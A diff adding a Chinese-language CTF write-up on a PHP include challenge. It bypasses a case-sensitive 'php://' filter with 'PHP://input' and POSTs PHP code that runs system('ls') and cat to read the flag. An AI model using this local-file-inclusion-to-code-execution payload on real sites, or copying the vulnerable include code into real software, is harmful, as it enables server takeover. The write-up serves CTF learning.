@@ -343,3 +343,61 @@ var_dump(base64_encode($var));
  3. str_replace('被替换字符串','需要替换的字符串','整个字符串')，返回被修改的字符串
  4. strchr('str1','str2')用于匹配str1中是否有str2
 - 最后payload一下得到答案
+
+# Web_php_include
+- 对于include函数的一种攻击
+- 涉及到php输入流控制，strstr函数的绕过，以及LFI的基本内容
+- 首先先看题目代码
+```php
+<?php
+show_source(__FILE__);
+echo $_GET['hello'];
+$page=$_GET['page'];
+while (strstr($page, "php://")) {
+    $page=str_replace("php://", "", $page);
+}
+include($page);
+?>
+```
+- 这题需要通过$page获得flag
+## php输入流控制
+- 这里有详细解析http://www.nowamagic.net/academy/detail/12220520
+- 其实就是通过POST方法获取输入流，那么结合include函数的话，就可以达到自己写php当成文件，使php执行include函数
+## strstr绕过
+- 区分大小写
+## LFI
+- 就是通过include函数和require函数执行文件，那么通过这两个东西可以达到一些攻击的方式
+## 解题
+- 首先需要通过page注入一段恶意代码，也就是php输入流：
+```php
+http://220.249.52.133:30537/?page=PHP://input
+```
+- PHP是用来绕过strstr的
+- 然后就可以通过POST方法把想要传的数据传到input中，再传给page就可以了
+- POST：
+```php
+<?php
+system('ls');
+?>
+```
+- 得到：
+```
+fl4gisisish3r3.php
+index.php
+phpinfo.php
+```
+- 再：
+```php
+<?php
+system('cat fl4gisisish3r3.php');
+?>
+```
+- 得到：
+```php
+$flag="ctf{876a5fca-96c6-4cbd-9075-46f0c89475d2}";
+```
+## 总结
+1. php输入流的含义以及操作方法
+2. strstr区分大小写，利用这点进行绕过
+3. LFI的基本原理
+
